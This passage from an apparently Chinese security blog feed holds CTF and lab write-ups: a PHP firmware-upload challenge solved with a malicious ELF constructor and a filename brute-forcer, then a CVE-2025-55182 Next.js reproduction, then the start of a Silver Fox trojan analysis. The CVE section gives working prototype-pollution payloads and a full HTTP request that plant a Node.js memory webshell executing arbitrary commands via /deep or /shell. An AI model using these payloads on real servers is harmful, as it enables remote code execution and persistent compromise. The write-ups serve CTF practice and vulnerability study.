class="line">        &#125;</span><br><span class="line">        <span class="variable">$flags</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$handle</span>, <span class="number">4</span>);</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$handle</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$flags</span>!==<span class="string">&quot;\x7fELF&quot;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$firmware_filename</span>);</span><br><span class="line">            <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">            <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&#x27;status&#x27;</span>=&gt;<span class="number">0</span>,<span class="string">&#x27;info&#x27;</span>=&gt;<span class="string">&#x27;上传失败，不是有效的 ELF 文件。&#x27;</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&#x27;status&#x27;</span>=&gt;<span class="number">1</span>,<span class="string">&#x27;info&#x27;</span>=&gt;<span class="string">&#x27;上传成功！&#x27;</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;CONTENT_TYPE&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;CONTENT_TYPE&#x27;</span>],<span class="string">&#x27;form-data&#x27;</span>)!=<span class="literal">FALSE</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">            <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&#x27;status&#x27;</span>=&gt;<span class="number">0</span>,<span class="string">&#x27;info&#x27;</span>=&gt;<span class="string">&#x27;上传出错，音乐文件最大支持 1MB。&#x27;</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="variable">$path</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clean_string</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$str</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">    <span class="variable">$str</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">    <span class="variable">$str</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">    <span class="variable">$str</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>,<span class="number">0</span>,<span class="number">32</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$path</span>))&#123;</span><br><span class="line">    <span class="variable">$path</span>=<span class="title function_ invoke__">clean_string</span>(<span class="title function_ invoke__">trim</span>((<span class="keyword">string</span>) <span class="variable">$path</span>));</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$path</span>)&lt;=<span class="number">0</span>||<span class="title function_ invoke__">strlen</span>(<span class="variable">$path</span>)&gt;<span class="number">64</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&#x27;status&#x27;</span>=&gt;<span class="number">0</span>,<span class="string">&#x27;info&#x27;</span>=&gt;<span class="string">&#x27;输入格式或长度不符合规定！&#x27;</span>)));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$firmware_filename</span>=<span class="keyword">__DIR__</span>.<span class="string">&quot;/../uploads/firmware/&quot;</span>.<span class="variable">$path</span>.<span class="string">&quot;.elf&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$firmware_filename</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">            <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&#x27;status&#x27;</span>=&gt;<span class="number">0</span>,<span class="string">&#x27;info&#x27;</span>=&gt;<span class="string">&#x27;固件文件不存在！&#x27;</span>)));</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="variable">$elf</span> = FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;</span></span><br><span class="line"><span class="string">                    extern char * version;</span></span><br><span class="line"><span class="string">                &quot;</span>, <span class="variable">$firmware_filename</span>);</span><br><span class="line">                <span class="variable">$version</span>=(<span class="keyword">string</span>) FFI::<span class="keyword">string</span>(<span class="variable">$elf</span>-&gt;version);</span><br><span class="line">                <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">                <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&#x27;status&#x27;</span>=&gt;<span class="number">1</span>,<span class="string">&#x27;info&#x27;</span>=&gt;<span class="string">&#x27;固件版本号：&#x27;</span>.<span class="variable">$version</span>)));</span><br><span class="line">            &#125;<span class="keyword">catch</span>(<span class="built_in">Error</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">                <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">                <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&#x27;status&#x27;</span>=&gt;<span class="number">0</span>,<span class="string">&#x27;info&#x27;</span>=&gt;<span class="string">&#x27;加载固件文件时发生错误！&#x27;</span>)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;script&gt;<span class="title function_ invoke__">nav_active</span>();<span class="title function_ invoke__">nav_user</span>(<span class="string">&#x27;&lt;?php echo @$_SESSION[&#x27;</span>user<span class="string">&#x27;]; ?&gt;&#x27;</span>);&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;css/fileinput.min.css&quot;</span>&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;css/fileinput-rtl.min.css&quot;</span>&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;js/fileinput.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">    &lt;script src=<span class="string">&quot;js/locales/zh.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">        &lt;div&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot; <span class="title">style</span>=&quot;<span class="title">margin</span>-<span class="title">top</span>:30<span class="title">px</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">h3</span> <span class="title">style</span>=&quot;<span class="title">margin</span>-<span class="title">bottom</span>:15<span class="title">px</span>;&quot;&gt;固件更新&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;<span class="title">input</span> <span class="title">id</span>=&quot;<span class="title">upload</span>&quot; <span class="title">type</span>=&quot;<span class="title">file</span>&quot; <span class="title">class</span>=&quot;<span class="title">file</span>&quot; <span class="title">data</span>-<span class="title">preview</span>-<span class="title">file</span>-<span class="title">type</span>=&quot;<span class="title">text</span>&quot; &gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">style</span>=&quot;<span class="title">height</span>:30<span class="title">px</span>&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">info1</span>&quot; <span class="title">class</span>=&quot;<span class="title">alert</span>&quot; <span class="title">role</span>=&quot;<span class="title">alert</span>&quot; <span class="title">style</span>=&#x27;<span class="title">display</span>: <span class="title">none</span>;&#x27;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">        $(&quot;#<span class="title">upload</span>&quot;).<span class="title">fileinput</span>(</span>&#123;language: <span class="string">&#x27;zh&#x27;</span>,uploadUrl: <span class="string">&#x27;/hotload.php?page=firmware&#x27;</span>&#125;);</span><br><span class="line">        $(<span class="string">&quot;#upload&quot;</span>).<span class="title function_ invoke__">on</span>(<span class="string">&quot;fileuploaded&quot;</span>, function (event, data, previewId, index) &#123;</span><br><span class="line">            <span class="keyword">var</span> data = data.response;</span><br><span class="line">            <span class="keyword">if</span> (data.status==<span class="number">1</span>)&#123;</span><br><span class="line">                $(<span class="string">&#x27;#info1&#x27;</span>).<span class="title function_ invoke__">removeClass</span>(<span class="string">&#x27;alert-danger&#x27;</span>);</span><br><span class="line">                $(<span class="string">&#x27;#info1&#x27;</span>).<span class="title function_ invoke__">addClass</span>(<span class="string">&#x27;alert-success&#x27;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                $(<span class="string">&#x27;#info1&#x27;</span>).<span class="title function_ invoke__">removeClass</span>(<span class="string">&#x27;alert-success&#x27;</span>);</span><br><span class="line">                $(<span class="string">&#x27;#info1&#x27;</span>).<span class="title function_ invoke__">addClass</span>(<span class="string">&#x27;alert-danger&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $(<span class="string">&#x27;#info1&#x27;</span>).<span class="title function_ invoke__">html</span>(data.info);</span><br><span class="line">            $(<span class="string">&#x27;#info1&#x27;</span>).<span class="title function_ invoke__">show</span>();</span><br><span class="line">        &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line"></span><br><span class="line">    &lt;hr/&gt;&lt;h4 style=<span class="string">&quot;text-align:left;margin-bottom:15px;color:gray;&quot;</span>&gt;调试模式（读取固件版本号)&lt;/h4&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span>=&#x27;<span class="title">form</span>-<span class="title">container</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&#x27;<span class="title">form</span>-<span class="title">group</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span>&quot; <span class="title">placeholder</span>=&quot;固件文件&quot; <span class="title">id</span>=&quot;<span class="title">path</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">info</span> <span class="title">btn</span>-<span class="title">block</span>&quot; <span class="title">onclick</span>=&quot;<span class="title">submit</span>()&quot;&gt;读取&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">info2</span>&quot; <span class="title">class</span>=&quot;<span class="title">alert</span>&quot; <span class="title">role</span>=&quot;<span class="title">alert</span>&quot; <span class="title">style</span>=&quot;<span class="title">display</span>: <span class="title">none</span>;&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">function</span> <span class="title">submit</span>()</span>&#123;</span><br><span class="line">    $(<span class="string">&#x27;#info2&#x27;</span>).<span class="title function_ invoke__">hide</span>();</span><br><span class="line">    $.<span class="title function_ invoke__">ajax</span>(&#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&quot;/hotload.php?page=firmware&quot;</span>,</span><br><span class="line">        <span class="attr">data</span>: &#123;<span class="attr">path</span>: $(<span class="string">&#x27;#path&#x27;</span>).<span class="title function_ invoke__">val</span>()&#125;,</span><br><span class="line">        dataType: <span class="string">&quot;json&quot;</span>,</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (data.status==<span class="number">1</span>)&#123;</span><br><span class="line">                $(<span class="string">&#x27;#info2&#x27;</span>).<span class="title function_ invoke__">removeClass</span>(<span class="string">&#x27;alert-danger&#x27;</span>);</span><br><span class="line">                $(<span class="string">&#x27;#info2&#x27;</span>).<span class="title function_ invoke__">addClass</span>(<span class="string">&#x27;alert-success&#x27;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                $(<span class="string">&#x27;#info2&#x27;</span>).<span class="title function_ invoke__">removeClass</span>(<span class="string">&#x27;alert-success&#x27;</span>);</span><br><span class="line">                $(<span class="string">&#x27;#info2&#x27;</span>).<span class="title function_ invoke__">addClass</span>(<span class="string">&#x27;alert-danger&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $(<span class="string">&#x27;#info2&#x27;</span>).<span class="title function_ invoke__">html</span>(data.info);</span><br><span class="line">            $(<span class="string">&#x27;#info2&#x27;</span>).<span class="title function_ invoke__">show</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">            &lt;p style=<span class="string">&quot;visibility: hidden&quot;</span>&gt;</span><br><span class="line">                Lorem ipsum dolor sit amet, consectetur adipisicing elit. Animi aspernatur beatae commodi dolorem in praesentium quia quis sit ullam. Aut facere nihil non soluta temporibus. Modi molestias suscipit voluptate. A?</span><br><span class="line">                Lorem ipsum dolor sit amet, consectetur adipisicing elit. Aliquid beatae consequatur deserunt earum eligendi ex, illum iure nostrum nulla obcaecati pariatur placeat quae reiciendis repellat similique tenetur totam vel voluptatum?</span><br><span class="line">                Lorem ipsum dolor sit amet, consectetur adipisicing elit. Aut autem consectetur cum ex expedita id incidunt inventore ipsa laudantium maiores nihil quia quo quod rem, reprehenderit repudiandae sunt unde voluptatibus?</span><br><span class="line">                Lorem ipsum dolor sit amet, consectetur adipisicing elit. Accusantium ad adipisci animi, commodi cumque doloribus ducimus eaque eveniet illo iste, maxime, molestiae molestias neque nostrum odio officiis reiciendis rem voluptates?</span><br><span class="line">            &lt;/p&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/div&gt;</span><br></pre></td></tr></table></figure><p>在#firmware上传elf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">char _version[0x130];</span><br><span class="line">char *version = _version;</span><br><span class="line"></span><br><span class="line">__attribute__((constructor)) void fun() &#123;</span><br><span class="line">    memset(version, 0, 0x130);</span><br><span class="line">    FILE *fp = popen(&quot;/usr/bin/tac /flag&quot;, &quot;r&quot;);</span><br><span class="line">    if (fp == NULL) return;</span><br><span class="line">    fread(version, 1, 0x100, fp);</span><br><span class="line">    pclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译成elf<br>上传就可以了</p><p>爆破文件名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generate_filenames</span>(<span class="params"><span class="variable">$start_time</span>, <span class="variable">$end_time</span>, <span class="variable">$user</span></span>) </span>&#123;  </span><br><span class="line">    <span class="variable">$results</span> = [];  </span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$time</span> = <span class="variable">$start_time</span>; <span class="variable">$time</span> &lt;= <span class="variable">$end_time</span>; <span class="variable">$time</span>++) &#123;  </span><br><span class="line">        <span class="title function_ invoke__">mt_srand</span>(<span class="variable">$time</span>);  </span><br><span class="line">        <span class="variable">$rand</span> = <span class="title function_ invoke__">mt_rand</span>();  </span><br><span class="line">        <span class="variable">$filename</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$rand</span> . <span class="variable">$user</span>);  </span><br><span class="line">        <span class="variable">$results</span>[] = <span class="variable">$filename</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$results</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 已知信息  </span></span><br><span class="line"><span class="variable">$user</span> = <span class="string">&quot;admin&quot;</span>;  <span class="comment">// 固定值  </span></span><br><span class="line"><span class="variable">$date</span> = <span class="title function_ invoke__">strtotime</span>(<span class="string">&quot;Tue, 11 Nov 2025 10:20:28 GMT&quot;</span>);  <span class="comment">// 已知时间  </span></span><br><span class="line"><span class="variable">$time_range</span> = <span class="number">100</span>;  <span class="comment">// 时间偏移范围 ±100 秒  </span></span><br><span class="line"><span class="comment">// 开始暴力破解  </span></span><br><span class="line"><span class="variable">$start_time</span> = <span class="variable">$date</span> - <span class="variable">$time_range</span>;  </span><br><span class="line"><span class="variable">$end_time</span> = <span class="variable">$date</span> + <span class="variable">$time_range</span>;  </span><br><span class="line"><span class="variable">$possible_filenames</span> = <span class="title function_ invoke__">generate_filenames</span>(<span class="variable">$start_time</span>, <span class="variable">$end_time</span>, <span class="variable">$user</span>);  </span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$possible_filenames</span> <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$filename</span> . <span class="string">&quot;.elf\n&quot;</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>去浏览器复制时间去爆破就行了<br>然后把字典复制到bp里面爆<br>就可以爆破出来</p><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765431642097-24a80500-1e89-4fd8-bd9b-d6d2e92976e3.jpg" alt="null"></p><p>flag{iz4w8x9zjdsqael9fbv7c2l2qp5ao6f9}</p><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765431642191-44cb4fb1-84ea-463f-bcb6-506d73fe95dd.jpg" alt="null"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;webpwn&lt;/p&gt;</summary>
    
    
    
    <category term="WriteUp" scheme="https://flypigc.github.io/categories/WriteUp/"/>
    
    
    <category term="webpwn" scheme="https://flypigc.github.io/tags/webpwn/"/>
    
  </entry>
  
  <entry>
    <title>js内存马-CVE-2025-55182</title>
    <link href="https://flypigc.github.io/2025/12/11/js%E5%86%85%E5%AD%98%E9%A9%AC-CVE-2025-55182/"/>
    <id>https://flypigc.github.io/2025/12/11/js%E5%86%85%E5%AD%98%E9%A9%AC-CVE-2025-55182/</id>
    <published>2025-12-11T07:15:38.475Z</published>
    <updated>2025-12-20T01:53:10.747Z</updated>
    
    <content type="html"><![CDATA[<p>js内存马-CVE-2025-55182</p><hr><span id="more"></span><p>版本1不知道是太长了还是什么原因</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;then&quot;: &quot;$1:__proto__:then&quot;,</span><br><span class="line">  &quot;status&quot;: &quot;resolved_model&quot;,</span><br><span class="line">  &quot;reason&quot;: -1,</span><br><span class="line">  &quot;value&quot;: &quot;&#123;\&quot;then\&quot;:\&quot;$B1337\&quot;&#125;&quot;,</span><br><span class="line">  &quot;_response&quot;: &#123;</span><br><span class="line">    &quot;_prefix&quot;: &quot;(async()=&gt;&#123;const http=await import(&#x27;node:http&#x27;);const url=await import(&#x27;node:url&#x27;);const cp=await import(&#x27;node:child_process&#x27;);const originalEmit=http.Server.prototype.emit;http.Server.prototype.emit=function(event,...args)&#123;if(event===&#x27;request&#x27;)&#123;const[req,res]=args;const parsedUrl=url.parse(req.url,true);if(parsedUrl.pathname===&#x27;/deep&#x27;)&#123;const cmd=parsedUrl.query.cmd||&#x27;whoami&#x27;;cp.exec(cmd,(err,stdout,stderr)=&gt;&#123;res.writeHead(200,&#123;&#x27;Content-Type&#x27;:&#x27;application/json&#x27;&#125;);res.end(JSON.stringify(&#123;success:!err,stdout,stderr,error:err?err.message:null&#125;));&#125;);return true;&#125;&#125;return originalEmit.apply(this,arguments);&#125;;&#125;)();&quot;,</span><br><span class="line">    &quot;_chunks&quot;: &quot;$Q2&quot;,</span><br><span class="line">    &quot;_formData&quot;: &#123;</span><br><span class="line">      &quot;get&quot;: &quot;$1:constructor:constructor&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#123;&quot;then&quot;:&quot;$1:__proto__:then&quot;,&quot;status&quot;:&quot;resolved_model&quot;,&quot;value&quot;:&quot;&#123;\&quot;then\&quot;:\&quot;$B1337\&quot;&#125;&quot;,&quot;_response&quot;:&#123;&quot;_prefix&quot;:&quot;(async()=&gt;&#123;require(&#x27;http&#x27;).Server.prototype.emit=function(e,...a)&#123;if(e==&#x27;request&#x27;&amp;&amp;require(&#x27;url&#x27;).parse(a[0].url).pathname==&#x27;/shell&#x27;)&#123;require(&#x27;child_process&#x27;).exec(a[0].query.c||&#x27;id&#x27;,(e,o,s)=&gt;a[1].end(JSON.stringify(&#123;o,s&#125;)));return true&#125;return this.__proto__.emit.apply(this,arguments)&#125;&#125;)();&quot;,&quot;_chunks&quot;:&quot;$Q&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p>CVE-2025-55182</p><p>春秋云镜复现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /apps HTTP/2</span><br><span class="line">Host: eci-2zeiverm334jp4jylqln.cloudeci1.ichunqiu.com</span><br><span class="line">User-Agent: Mozilla/5.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Next-Action: x</span><br><span class="line">X-Nextjs-Request-Id: test123</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary</span><br><span class="line">Content-Length: 594</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary</span><br><span class="line">Content-Disposition: form-data; name=&quot;0&quot;</span><br><span class="line"></span><br><span class="line">&#123;&quot;then&quot;:&quot;$1:__proto__:then&quot;,&quot;status&quot;:&quot;resolved_model&quot;,&quot;value&quot;:&quot;&#123;\&quot;then\&quot;:\&quot;$B1337\&quot;&#125;&quot;,&quot;_response&quot;:&#123;&quot;_prefix&quot;:&quot;(async()=&gt;&#123;require(&#x27;http&#x27;).Server.prototype.emit=function(e,...a)&#123;if(e==&#x27;request&#x27;&amp;&amp;require(&#x27;url&#x27;).parse(a[0].url).pathname==&#x27;/shell&#x27;)&#123;require(&#x27;child_process&#x27;).exec(a[0].query.c||&#x27;id&#x27;,(e,o,s)=&gt;a[1].end(JSON.stringify(&#123;o,s&#125;)));return true&#125;return this.__proto__.emit.apply(this,arguments)&#125;&#125;)();&quot;,&quot;_chunks&quot;:&quot;$Q&quot;&#125;&#125;</span><br><span class="line">------WebKitFormBoundary</span><br><span class="line">Content-Disposition: form-data; name=&quot;1&quot;</span><br><span class="line"></span><br><span class="line">&quot;$@0&quot;</span><br><span class="line">------WebKitFormBoundary--</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765431645492-c473cbb2-4073-486b-aff7-8eaf0b990517.jpg" alt="null"><br>访问获取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/deep?cmd=cd%20../../;cat%20/flag</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765431645580-511643f8-23b2-4478-9eb3-ba1a8b48c841.jpg" alt="null"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;js内存马-CVE-2025-55182&lt;/p&gt;
&lt;hr&gt;</summary>
    
    
    
    <category term="CVE" scheme="https://flypigc.github.io/categories/CVE/"/>
    
    
    <category term="web安全" scheme="https://flypigc.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>银狐木马样本深度分析与后门域名溯源</title>
    <link href="https://flypigc.github.io/2025/12/11/%E9%93%B6%E7%8B%90%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/"/>
    <id>https://flypigc.github.io/2025/12/11/%E9%93%B6%E7%8B%90%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/</id>
    <published>2025-12-11T07:15:38.469Z</published>
    <updated>2025-12-20T01:57:52.816Z</updated>
    
    <content type="html"><![CDATA[<p>银狐木马样本分析</p><hr><span id="more"></span><p>由于制做C2工具的黑客留下了后门，所以这个木马是有后门的，你能找到它的后门吗</p><p>WriteUp<br>wmain函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__int64 wmain()</span><br><span class="line">&#123;</span><br><span class="line">  HWND hWnd; // rax</span><br><span class="line">  DWORD idThread; // eax</span><br><span class="line"></span><br><span class="line">  SetUnhandledExceptionFilter(TopLevelExceptionFilter);</span><br><span class="line">  hWnd = GetConsoleWindow();</span><br><span class="line">  ShowWindow(hWnd, 0);</span><br><span class="line">  idThread = GetCurrentThreadId();</span><br><span class="line">  PostThreadMessageA(idThread, 0, 0, 0);</span><br><span class="line">  GetInputState();</span><br><span class="line">  sub_140008750();</span><br><span class="line">  hObject = CreateThread(0, 0, sub_14000A440, 0, 0, 0);</span><br><span class="line">  WaitForSingleObject(hObject, 0xFFFFFFFF);</span><br><span class="line">  CloseHandle(hObject);</span><br><span class="line">  Sleep(0x12Cu);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先看sub_140008750函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 